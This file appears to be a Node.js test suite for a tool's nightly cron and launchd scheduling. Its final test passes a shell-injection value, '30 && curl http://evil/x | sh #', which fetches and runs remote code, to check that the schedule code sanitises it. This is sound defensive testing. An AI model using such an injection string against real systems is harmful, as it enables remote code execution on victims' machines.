'use strict';
// Tests for C2: scheduling the nightly `keyflip dream` (src/schedule.js). All system calls
// (launchctl/crontab) go through an injected runner and a temp home, so nothing touches the
// real machine.
const test = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const schedule = require('../src/schedule');

function fakeRunner(recorder, cronState) {
  return function (cmd, args, input) {
    recorder.push({ cmd: cmd, args: args, input: input });
    if (cmd === 'which') return { code: 0, stdout: '/usr/local/bin/keyflip\n' };
    if (cmd === 'crontab' && args[0] === '-l') return { code: 0, stdout: cronState.text || '' };
    if (cmd === 'crontab' && args[0] === '-') { cronState.text = input; return { code: 0 }; }
    return { code: 0, stdout: '' };
  };
}

test('parseAt clamps a HH:MM; buildPlist embeds the dream command + time', function () {
  assert.deepStrictEqual(schedule.parseAt('03:30'), { h: 3, m: 30 });
  assert.deepStrictEqual(schedule.parseAt('bogus'), { h: 3, m: 0 });
  const plist = schedule.buildPlist({ at: '04:15', days: 30, run: function () { return { code: 1 }; } });
  assert.ok(plist.indexOf('<key>Hour</key><integer>4</integer>') !== -1);
  assert.ok(plist.indexOf('<key>Minute</key><integer>15</integer>') !== -1);
  assert.ok(plist.indexOf('dream') !== -1 && plist.indexOf('--apply') !== -1);
  assert.ok(plist.indexOf(schedule.LABEL) !== -1);
});

test('cronLine encodes the schedule + a managed marker; installCron is idempotent', function () {
  const rec = [], cron = { text: '0 0 * * * other-job\n' };
  const runner = fakeRunner(rec, cron);
  const line = schedule.cronLine({ at: '02:05', days: 14, run: runner });
  assert.ok(/^5 2 \* \* \* /.test(line), 'minute hour * * *');
  assert.ok(line.indexOf(schedule.CRON_MARK) !== -1);

  schedule.installCron({ at: '02:05', days: 14, run: runner });
  assert.ok(cron.text.indexOf('other-job') !== -1, 'existing crontab preserved');
  assert.ok(cron.text.indexOf(schedule.CRON_MARK) !== -1, 'keyflip line added');
  // installing again must not duplicate the managed line
  schedule.installCron({ at: '02:05', days: 14, run: runner });
  const count = (cron.text.match(new RegExp('keyflip-dream', 'g')) || []).length;
  assert.strictEqual(count, 1, 'no duplicate managed line');
});

test('uninstallCron removes only the managed line, keeps the rest', function () {
  const rec = [], cron = { text: '0 0 * * * other-job\n5 2 * * * something ' + schedule.CRON_MARK + '\n' };
  const runner = fakeRunner(rec, cron);
  const r = schedule.uninstallCron({ run: runner });
  assert.strictEqual(r.existed, true);
  assert.ok(cron.text.indexOf('other-job') !== -1);
  assert.strictEqual(cron.text.indexOf(schedule.CRON_MARK), -1);
});

test('install/uninstall on macOS writes + removes the launchd plist (temp home)', function () {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'keyflip-sched-'));
  const rec = [];
  const runner = fakeRunner(rec, {});
  const ctx = { platform: 'darwin' };
  const r = schedule.install(ctx, { at: '03:00', days: 30, home: home, run: runner });
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.kind, 'launchd');
  assert.ok(fs.existsSync(schedule.plistPath(home)), 'plist written');
  assert.ok(rec.some(function (c) { return c.cmd === 'launchctl' && c.args[0] === 'load'; }), 'launchctl load called');
  const u = schedule.uninstall(ctx, { home: home, run: runner });
  assert.strictEqual(u.ok, true);
  assert.strictEqual(fs.existsSync(schedule.plistPath(home)), false, 'plist removed');
});

test('scheduling is unsupported off macOS/Linux', function () {
  const r = schedule.install({ platform: 'win32' }, {});
  assert.strictEqual(r.ok, false);
  assert.strictEqual(r.kind, 'unsupported');
});

// SECURITY (review P0 #3): older_than_days flows unescaped into the Linux cron /bin/sh -c
// line via the MCP path (no server-side schema validation). It MUST be coerced to a bounded
// integer at the schedule boundary so it can never carry shell metacharacters.
test('cronLine coerces a malicious days value to a bounded integer (no shell injection)', function () {
  const runner = fakeRunner([], {});
  const evil = '30 && curl http://evil/x | sh #';
  const line = schedule.cronLine({ days: evil, run: runner });
  assert.strictEqual(line.indexOf('curl'), -1, 'injected command must not survive into the cron line');
  assert.strictEqual(line.indexOf('&&'), -1, 'shell metacharacters must not survive');
  assert.ok(/--older-than 30d(\s|$)/.test(line), 'the numeric prefix is kept as a clean 30d, nothing more: ' + line);
  // out-of-range / non-numeric fall back or clamp
  assert.ok(/--older-than 1d(\s|$)/.test(schedule.cronLine({ days: -5, run: runner })), 'clamped to >=1');
  assert.ok(/--older-than 3650d(\s|$)/.test(schedule.cronLine({ days: 999999, run: runner })), 'clamped to <=3650');
  assert.ok(/--older-than 30d(\s|$)/.test(schedule.cronLine({ days: 'garbage', run: runner })), 'non-numeric -> default 30');
});
